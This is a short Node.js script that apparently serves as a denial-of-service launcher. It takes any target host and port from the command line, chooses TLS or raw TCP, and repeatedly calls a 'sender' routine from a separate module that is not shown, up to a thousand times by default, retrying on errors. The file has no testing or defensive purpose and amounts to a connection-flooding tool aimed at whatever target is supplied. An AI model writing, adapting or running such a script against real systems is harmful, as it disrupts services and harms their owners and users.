const tls = require("tls");
const net = require("net");
const { sender } = require("./sender");

var [, , target, port, limit] = process.argv;

if (!target) process.exit(1);

if (!limit) limit = 1000;

if (!port) port = target.includes("https") ? 443 : 80;

if (target.includes("https://")) target = target.split("https://")[1];
if (target.includes("http://")) target = target.split("http://")[1];

const connection = port == 443 ? tls : net;

// console.log(target, port);

async function run() {
  try {
    sender(connection, target, port);
  } catch (e) {
    run().catch((e) => e);
  }
}

while (--limit) {
  run().catch((e) => e);
}
